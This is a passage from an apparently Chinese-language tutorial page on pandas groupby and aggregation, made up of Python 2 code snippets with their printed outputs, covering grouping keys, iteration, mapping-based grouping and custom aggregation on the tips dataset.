<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">key1  key2</span><br><span class="line">a     one     0.266446</span><br><span class="line">      two     0.316974</span><br><span class="line">b     one    -0.574834</span><br><span class="line">      two    -0.780594</span><br><span class="line">Name: data1, dtype: float64</span><br><span class="line"></span><br><span class="line">key2       one       two</span><br><span class="line">key1</span><br><span class="line">a     0.266446  0.316974</span><br><span class="line">b    -0.574834 -0.780594</span><br></pre></td></tr></table></figure>
</li>
<li><p>分组键可以是任何长度适当的数组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">states = np.array([<span class="string">'Ohio'</span>, <span class="string">'California'</span>, <span class="string">'California'</span>, <span class="string">'Ohio'</span>, <span class="string">'Ohio'</span>])</span><br><span class="line">years = np.array([<span class="number">2005</span>,<span class="number">2005</span>, <span class="number">2006</span>, <span class="number">2005</span>, <span class="number">2006</span>])</span><br><span class="line"><span class="keyword">print</span> df[<span class="string">'data1'</span>].groupby([states, years]).mean()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">California  2005    0.316974</span><br><span class="line">            2006   -0.574834</span><br><span class="line">Ohio        2005   -0.481406</span><br><span class="line">            2006    0.715109</span><br><span class="line">Name: data1, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>分组键也可以是列名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 因为 key2列不是数值数据，所以从结果中排除了</span></span><br><span class="line"><span class="keyword">print</span> df.groupby(<span class="string">'key1'</span>).mean()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> df.groupby([<span class="string">'key1'</span>, <span class="string">'key2'</span>]).mean()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">         data1     data2</span><br><span class="line">key1</span><br><span class="line">a     0.283288  0.303794</span><br><span class="line">b    -0.677714 -0.125522</span><br><span class="line"></span><br><span class="line">              data1     data2</span><br><span class="line">key1 key2</span><br><span class="line">a    one   0.266446 -0.146678</span><br><span class="line">     two   0.316974  1.204739</span><br><span class="line">b    one  -0.574834 -1.315783</span><br><span class="line">     two  -0.780594  1.064739</span><br></pre></td></tr></table></figure>
</li>
<li><p>GroupBy中 size方法，返回一个含有分组大小的Series</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> df.groupby([<span class="string">'key1'</span>, <span class="string">'key2'</span>]).size()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">key1  key2</span><br><span class="line">a     one     2</span><br><span class="line">      two     1</span><br><span class="line">b     one     1</span><br><span class="line">      two     1</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="对分组进行迭代"><a href="#对分组进行迭代" class="headerlink" title="对分组进行迭代"></a>对分组进行迭代</h3><ol>
<li><p>GroupBy对象支持迭代，可以产生一组二元元组(由分组名和数据块组成)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> name, group <span class="keyword">in</span> df.groupby(<span class="string">'key1'</span>):</span><br><span class="line">    <span class="keyword">print</span> name</span><br><span class="line">    <span class="keyword">print</span> group</span><br><span class="line"><span class="keyword">print</span> <span class="string">"------------分界线----------"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#多重键的情况，元组的第一元素将会有键值组成的元组</span></span><br><span class="line"><span class="keyword">for</span> (k1, k2), group <span class="keyword">in</span> df.groupby([<span class="string">'key1'</span>, <span class="string">'key2'</span>]):</span><br><span class="line">    <span class="keyword">print</span> k1, k2</span><br><span class="line">    <span class="keyword">print</span> group</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">a</span><br><span class="line">      data1     data2 key1 key2</span><br><span class="line">0 -0.182217 -1.369371    a  one</span><br><span class="line">1  0.316974  1.204739    a  two</span><br><span class="line">4  0.715109  1.076016    a  one</span><br><span class="line">b</span><br><span class="line">      data1     data2 key1 key2</span><br><span class="line">2 -0.574834 -1.315783    b  one</span><br><span class="line">3 -0.780594  1.064739    b  two</span><br><span class="line">------------分界线----------</span><br><span class="line">a one</span><br><span class="line">      data1     data2 key1 key2</span><br><span class="line">0 -0.182217 -1.369371    a  one</span><br><span class="line">4  0.715109  1.076016    a  one</span><br><span class="line">a two</span><br><span class="line">      data1     data2 key1 key2</span><br><span class="line">1  0.316974  1.204739    a  two</span><br><span class="line">b one</span><br><span class="line">      data1     data2 key1 key2</span><br><span class="line">2 -0.574834 -1.315783    b  one</span><br><span class="line">b two</span><br><span class="line">      data1     data2 key1 key2</span><br><span class="line">3 -0.780594  1.064739    b  two</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以对这些数据片段做任何操作</p>
<ol>
<li><p>将这些数据片段做成一个字典</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pieces = dict(list(df.groupby(<span class="string">'key1'</span>)))</span><br><span class="line"><span class="keyword">print</span> pieces[<span class="string">'b'</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">      data1     data2 key1 key2</span><br><span class="line">2 -0.574834 -1.315783    b  one</span><br><span class="line">3 -0.780594  1.064739    b  two</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>groupby默认在axis = 0 上进行分组，可以在其他任意轴上进行分组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> df.dtypes</span><br><span class="line"><span class="keyword">print</span> <span class="string">"----------分割线----------"</span></span><br><span class="line">grouped = df.groupby(df.dtypes, axis = <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> dict(list(grouped))</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data1    float64</span><br><span class="line">data2    float64</span><br><span class="line">key1      object</span><br><span class="line">key2      object</span><br><span class="line">dtype: object</span><br><span class="line">----------分割线----------</span><br><span class="line">&#123;dtype(&apos;O&apos;):   key1 key2</span><br><span class="line">0    a  one</span><br><span class="line">1    a  two</span><br><span class="line">2    b  one</span><br><span class="line">3    b  two</span><br><span class="line">4    a  one, dtype(&apos;float64&apos;):       data1     data2</span><br><span class="line">0 -0.182217 -1.369371</span><br><span class="line">1  0.316974  1.204739</span><br><span class="line">2 -0.574834 -1.315783</span><br><span class="line">3 -0.780594  1.064739</span><br><span class="line">4  0.715109  1.076016&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="选取一个或一组列"><a href="#选取一个或一组列" class="headerlink" title="选取一个或一组列"></a>选取一个或一组列</h3><ol>
<li><p>对于GroupBy对象，用一个或一组列名对其索引，就能实现选取部分进行聚合</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">df.groupby(<span class="string">'key1'</span>)[<span class="string">'data1'</span>] <span class="comment">#等同于</span></span><br><span class="line">df[<span class="string">'data1'</span>].groupby(df[<span class="string">'key1'</span>])</span><br></pre></td></tr></table></figure>
</li>
<li><p>部分列进行聚合</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> df.groupby([<span class="string">'key1'</span>, <span class="string">'key2'</span>])[[<span class="string">'data2'</span>]].mean()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#分解</span></span><br><span class="line"><span class="comment">#索引操作返回的是一个已经分组的DF或Series</span></span><br><span class="line">s_grouped = df.groupby([<span class="string">'key1'</span>, <span class="string">'key2'</span>])[<span class="string">'data2'</span>]</span><br><span class="line"><span class="keyword">print</span> s_grouped</span><br><span class="line"><span class="keyword">print</span> s_grouped.mean()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">              data2</span><br><span class="line">key1 key2</span><br><span class="line">a    one  -0.146678</span><br><span class="line">     two   1.204739</span><br><span class="line">b    one  -1.315783</span><br><span class="line">     two   1.064739</span><br><span class="line">&lt;pandas.core.groupby.SeriesGroupBy object at 0x00000000079156A0&gt;</span><br><span class="line">key1  key2</span><br><span class="line">a     one    -0.146678</span><br><span class="line">      two     1.204739</span><br><span class="line">b     one    -1.315783</span><br><span class="line">      two     1.064739</span><br><span class="line">Name: data2, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="通过字典或Series进行分组"><a href="#通过字典或Series进行分组" class="headerlink" title="通过字典或Series进行分组"></a>通过字典或Series进行分组</h3><ol>
<li><p>除数组以外，分组信息可以是其他形式</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">people = pd.DataFrame(np.random.randn(<span class="number">5</span>,<span class="number">5</span>),</span><br><span class="line">                      columns = list(<span class="string">'abcde'</span>),</span><br><span class="line">                      index = [<span class="string">'Joe'</span>, <span class="string">'Steve'</span>, <span class="string">'Wes'</span>,<span class="string">'Jim'</span>, <span class="string">'Travis'</span>])</span><br><span class="line">people.ix[<span class="number">2</span>:<span class="number">3</span>, [<span class="string">'b'</span>, <span class="string">'c'</span>]] = np.nan <span class="comment">#添加几个Na值</span></span><br><span class="line"><span class="keyword">print</span> people</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line">mapping = &#123;<span class="string">'a'</span>: <span class="string">'red'</span>, <span class="string">'b'</span> : <span class="string">'red'</span>, <span class="string">'c'</span>: <span class="string">'blue'</span>,</span><br><span class="line">           <span class="string">'d'</span>: <span class="string">'blue'</span>, <span class="string">'e'</span>: <span class="string">'red'</span>, <span class="string">'f'</span>: <span class="string">'orange'</span>&#125;</span><br><span class="line"><span class="comment">#将字典传入GroupBy,会按照值所分组</span></span><br><span class="line">by_column = people.groupby(mapping, axis = <span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> by_column.sum()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Series和字典相同</span></span><br><span class="line">map_series = pd.Series(mapping)</span><br><span class="line"><span class="keyword">print</span> map_series</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> people.groupby(map_series, axis = <span class="number">1</span>).count()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">               a         b         c         d         e</span><br><span class="line">Joe    -2.127568  0.644625  1.527150 -1.723420  1.240916</span><br><span class="line">Steve   0.205717 -0.577552  1.116407 -0.688821  1.786387</span><br><span class="line">Wes     0.441377       NaN       NaN  1.937912 -1.081868</span><br><span class="line">Jim     1.229922 -1.001966 -0.582819 -1.197620 -0.644821</span><br><span class="line">Travis  0.724864  0.166980  0.245261  1.648537 -0.074912</span><br><span class="line"></span><br><span class="line">            blue       red</span><br><span class="line">Joe    -0.196269 -0.242027</span><br><span class="line">Steve   0.427586  1.414552</span><br><span class="line">Wes     1.937912 -0.640491</span><br><span class="line">Jim    -1.780440 -0.416866</span><br><span class="line">Travis  1.893798  0.816932</span><br><span class="line"></span><br><span class="line">a       red</span><br><span class="line">b       red</span><br><span class="line">c      blue</span><br><span class="line">d      blue</span><br><span class="line">e       red</span><br><span class="line">f    orange</span><br><span class="line">dtype: object</span><br><span class="line"></span><br><span class="line">        blue  red</span><br><span class="line">Joe        2    3</span><br><span class="line">Steve      2    3</span><br><span class="line">Wes        1    2</span><br><span class="line">Jim        2    3</span><br><span class="line">Travis     2    3</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="通过函数进行分组"><a href="#通过函数进行分组" class="headerlink" title="通过函数进行分组"></a>通过函数进行分组</h3><ol>
<li><p>任何被当做分组键的函数都会在各个索引值上被调用一次，返回值被当做分组名称</p>
<ol>
<li><p>前面的DF例子，索引值就是人的名字，假设需要按照人名的长度进行分组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> people.groupby(len).sum()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">          a         b         c         d         e</span><br><span class="line">3  3.725168  2.382762  1.475067  2.176910  1.303406</span><br><span class="line">5 -0.337910  0.084666 -0.675073  0.387191 -1.221990</span><br><span class="line">6  0.026837 -1.870793  0.744890  1.697728  0.727134</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>函数和其他混合使用,任何东西都会转化成数组</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key_list = [<span class="string">'one'</span>, <span class="string">'one'</span>, <span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'two'</span>]</span><br><span class="line"><span class="keyword">print</span> people.groupby([len, key_list]).min()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">              a         b         c         d         e</span><br><span class="line">3 one  1.439995  1.996867  0.052409  0.043291 -0.265731</span><br><span class="line">  two -0.140152  0.385895  1.422657  1.269645 -0.051861</span><br><span class="line">5 one -0.337910  0.084666 -0.675073  0.387191 -1.221990</span><br><span class="line">6 two  0.026837 -1.870793  0.744890  1.697728  0.727134</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="根据索引级别分组"><a href="#根据索引级别分组" class="headerlink" title="根据索引级别分组"></a>根据索引级别分组</h3><ol>
<li><p>层次化索引数据集可以用索引级别来进行聚合，通过level关键字传入级别编号或者名字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">columns = pd.MultiIndex.from_arrays([[<span class="string">'US'</span>, <span class="string">"US"</span>, <span class="string">'US'</span>, <span class="string">'JP'</span>, <span class="string">'JP'</span>],</span><br><span class="line">                                           [<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>]], names = [<span class="string">'city'</span>,<span class="string">'tenor'</span>])</span><br><span class="line">hier_df = pd.DataFrame(np.random.randn(<span class="number">4</span>,<span class="number">5</span>), columns = columns)</span><br><span class="line"><span class="keyword">print</span> hier_df</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hier_df.groupby(level = <span class="string">'city'</span>, axis = <span class="number">1</span>).count()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">city         US                            JP</span><br><span class="line">tenor         1         3         5         1         3</span><br><span class="line">0      0.033120  0.491344  0.711003  0.107217  0.380337</span><br><span class="line">1     -1.006004  0.288515 -2.025270 -0.046512  1.444702</span><br><span class="line">2     -0.915980 -0.914577 -1.542210  1.667547  0.462239</span><br><span class="line">3     -0.631588 -0.711685 -1.058402  0.351632 -0.374062</span><br><span class="line"></span><br><span class="line">city  JP  US</span><br><span class="line">0      2   3</span><br><span class="line">1      2   3</span><br><span class="line">2      2   3</span><br><span class="line">3      2   3</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="数据聚合"><a href="#数据聚合" class="headerlink" title="数据聚合"></a>数据聚合</h2><h3 id="分组后的聚合处理"><a href="#分组后的聚合处理" class="headerlink" title="分组后的聚合处理"></a>分组后的聚合处理</h3><ol>
<li><p>用quantile计算样本分位数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> df</span><br><span class="line"></span><br><span class="line">grouped = df.groupby(<span class="string">'key1'</span>)</span><br><span class="line"><span class="keyword">print</span> grouped[<span class="string">'data1'</span>].quantile(<span class="number">0.9</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      data1     data2 key1 key2</span><br><span class="line">0 -1.258749  3.171542    a  one</span><br><span class="line">1 -1.284484  1.429326    a  two</span><br><span class="line">2  0.229799 -0.981352    b  one</span><br><span class="line">3  0.479951 -0.836612    b  two</span><br><span class="line">4  0.043948  0.786918    a  one</span><br><span class="line">key1</span><br><span class="line">a   -0.216591</span><br><span class="line">b    0.454936</span><br><span class="line">Name: data1, dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用自己的聚合函数,传入agg或aggregate方法即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peak_to_peak</span><span class="params">(arr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> arr.max() - arr.min()</span><br><span class="line"><span class="keyword">print</span> grouped.agg(peak_to_peak)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#有些方法(如describe)也可以使用</span></span><br><span class="line"><span class="keyword">print</span> grouped.describe()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">         data1     data2</span><br><span class="line">key1</span><br><span class="line">a     1.328433  2.384624</span><br><span class="line">b     0.250152  0.144740</span><br><span class="line"></span><br><span class="line">               data1     data2</span><br><span class="line">key1</span><br><span class="line">a    count  3.000000  3.000000</span><br><span class="line">     mean  -0.833095  1.795929</span><br><span class="line">     std    0.759651  1.233858</span><br><span class="line">     min   -1.284484  0.786918</span><br><span class="line">     25%   -1.271617  1.108122</span><br><span class="line">     50%   -1.258749  1.429326</span><br><span class="line">     75%   -0.607400  2.300434</span><br><span class="line">     max    0.043948  3.171542</span><br><span class="line">b    count  2.000000  2.000000</span><br><span class="line">     mean   0.354875 -0.908982</span><br><span class="line">     std    0.176884  0.102346</span><br><span class="line">     min    0.229799 -0.981352</span><br><span class="line">     25%    0.292337 -0.945167</span><br><span class="line">     50%    0.354875 -0.908982</span><br><span class="line">     75%    0.417413 -0.872797</span><br><span class="line">     max    0.479951 -0.836612</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="经过优化的groupby的方法"><a href="#经过优化的groupby的方法" class="headerlink" title="经过优化的groupby的方法"></a>经过优化的groupby的方法</h3><div class="table-container">
<table>
<thead>
<tr>
<th>函数</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>count</td>
<td>分组中非NA值的数量</td>
</tr>
<tr>
<td>sum</td>
<td>非NA值的和</td>
</tr>
<tr>
<td>mean</td>
<td>非NA值的平均值</td>
</tr>
<tr>
<td>median</td>
<td>非NA值的算术中位数</td>
</tr>
<tr>
<td>std var</td>
<td>无偏(分母为n-1)标准差和方差</td>
</tr>
<tr>
<td>min max</td>
<td>非NA值的最小值和最大值</td>
</tr>
<tr>
<td>prod</td>
<td>非NA值的积</td>
</tr>
<tr>
<td>first last</td>
<td>第一个和最后一个非NA值</td>
</tr>
</tbody>
</table>
</div>
<h3 id="更高级的聚合功能"><a href="#更高级的聚合功能" class="headerlink" title="更高级的聚合功能"></a>更高级的聚合功能</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tips = pd.read_csv(<span class="string">'./pydata-book-master/ch08/tips.csv'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加"小费占总额百分比"的列</span></span><br><span class="line">tips[<span class="string">'tip_pct'</span>] = tips[<span class="string">'tip'</span>] /tips[<span class="string">'total_bill'</span>]</span><br><span class="line"><span class="keyword">print</span> tips[:<span class="number">6</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   total_bill   tip     sex smoker  day    time  size   tip_pct</span><br><span class="line">0       16.99  1.01  Female     No  Sun  Dinner     2  0.059447</span><br><span class="line">1       10.34  1.66    Male     No  Sun  Dinner     3  0.160542</span><br><span class="line">2       21.01  3.50    Male     No  Sun  Dinner     3  0.166587</span><br><span class="line">3       23.68  3.31    Male     No  Sun  Dinner     2  0.139780</span><br><span class="line">4       24.59  3.61  Female     No  Sun  Dinner     4  0.146808</span><br><span class="line">5       25.29  4.71    Male     No  Sun  Dinner     4  0.186240</span><br></pre></td></tr></table></figure>
<ol>
<li><p>面向列的多函数应用</p>
<ol>
<li><p>对于不同列使用不同的聚合函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#根据sex和smoker对tips进行分组</span></span><br><span class="line">grouped = tips.groupby([<span class="string">'sex'</span>, <span class="string">'smoker'</span>])</span><br><span class="line"></span><br><span class="line">grouped_pct = grouped[<span class="string">'tip_pct'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#对于优化的groupby方法可以使用函数名的字符串方式传入</span></span><br><span class="line"><span class="keyword">print</span> grouped_pct.agg(<span class="string">'mean'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#传入一组函数名，则各列或是对应的函数名命名</span></span><br><span class="line"><span class="keyword">print</span> grouped_pct.agg([<span class="string">'mean'</span>, <span class="string">'std'</span>])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#自定义名字</span></span><br><span class="line"><span class="keyword">print</span> grouped_pct.agg([(<span class="string">'foo'</span>, <span class="string">'mean'</span>), (<span class="string">'bar'</span>, <span class="string">'std'</span>)])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对部分列进行统计</span></span><br><span class="line">functions = [<span class="string">'count'</span>, <span class="string">'mean'</span>, <span class="string">'max'</span>]</span><br><span class="line">result = grouped[<span class="string">'tip_pct'</span>, <span class="string">'total_bill'</span>].agg(functions)</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对于不同列用不同函数， 传入字典</span></span><br><span class="line"><span class="keyword">print</span> grouped.agg(&#123;<span class="string">'tip'</span>: np.max, <span class="string">'size'</span>: <span class="string">'sum'</span>&#125;)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> grouped.agg(&#123;<span class="string">'tip'</span>: [<span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mean'</span>, np.std],</span><br><span class="line">                   <span class="string">'size'</span>: <span class="string">'sum'</span>&#125;)</span><br></pre></td></tr></table></figure>
